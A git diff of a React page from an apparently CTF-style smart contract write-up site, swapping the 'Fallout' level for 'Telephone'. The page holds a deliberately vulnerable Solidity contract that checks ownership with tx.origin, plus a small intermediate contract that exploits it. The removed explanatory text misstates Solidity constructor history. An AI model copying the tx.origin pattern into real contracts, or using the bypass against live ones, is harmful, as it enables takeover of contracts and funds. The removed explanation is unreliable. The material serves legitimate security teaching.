@@ -4,58 +4,55 @@ import { atomOneDark } from "react-syntax-highlighter/dist/esm/styles/hljs";
 import { AiFillCopy, AiOutlineFileDone } from "react-icons/ai";
 import TextDiv from "../../components/TextDiv";
 
-const Fallout = () => {
+const Telephone = () => {
   const [copy, setCopy] = useState(false);
   const codeString = `
 // SPDX-License-Identifier: MIT
-pragma solidity ^0.6.0;
+pragma solidity ^0.8.0;
 
-import "openzeppelin-contracts-06/math/SafeMath.sol";
+contract Telephone {
 
-contract Fallout {
-    using SafeMath for uint256;
-    mapping(address => uint) allocations;
-    address payable public owner;
+  address public owner;
 
-    /* constructor */
-    function Fal1out() public payable {
-        owner = msg.sender;
-        allocations[owner] = msg.value;
+  constructor() {
+    owner = msg.sender;
+  }
+
+  function changeOwner(address _owner) public {
+    if (tx.origin != msg.sender) {
+      owner = _owner;
     }
-
-    modifier onlyOwner() {
-        require(msg.sender == owner, "caller is not the owner");
-        _;
-    }
-
-    function allocate() public payable {
-        allocations[msg.sender] = allocations[msg.sender].add(msg.value);
-    }
-
-    function sendAllocation(address payable allocator) public {
-        require(allocations[allocator] > 0);
-        allocator.transfer(allocations[allocator]);
-    }
-
-    function collectAllocations() public onlyOwner {
-        msg.sender.transfer(address(this).balance);
-    }
-
-    function allocatorBalance(address allocator) public view returns (uint) {
-        return allocations[allocator];
-    }
-}`;
+  }
+}
+`;
 
   const solutionCode = `
-  await contract.Fal1out()
+  // SPDX-License-Identifier: MIT
+  pragma solidity ^0.8.0;
+  
+  interface ITelephone {
+      function changeOwner(address _owner) external;
+  }
+  
+  contract TelephoneCaller {
+      address public telephoneAddress;
+  
+      constructor(address _telephoneAddress) {
+          telephoneAddress = _telephoneAddress;
+      }
+  
+      function callTelephoneContract(address _newOwner) external {
+          ITelephone(telephoneAddress).changeOwner(_newOwner);
+      }
+  }  
 `;
 
   return (
     <div>
-      <h1 className="headerText">Fallout</h1>
+      <h1 className="headerText">Telephone</h1>
       <div className="content">
         <div className="highlighterHeader">
-          <p className="smallText"> Example code</p>
+          <p className="smallText">Example code</p>
           {copy ? (
             <button className="copyButton">
               <span>
@@ -96,7 +93,9 @@ contract Fallout {
       <div className="textBox">
         <TextDiv
           title="Hack"
-          text="Note that in Solidity versions prior to 0.5.0, the constructor function had a special name constructor(). Starting from Solidity version 0.5.0, the constructor can have the same name as the contract. So here just mistake."
+          text="Simple one. We'll make an intermediate contract on Remix. 
+          When we will call intermediate contract, which is calling telephone contract, msg.sender will equal to intermediate contract address, and 
+          tx.origin will equal to msg.sender (player address)."
         />
       </div>
       <SyntaxHighlighter
@@ -114,4 +113,4 @@ contract Fallout {
   );
 };
 
-export default Fallout;
+export default Telephone;
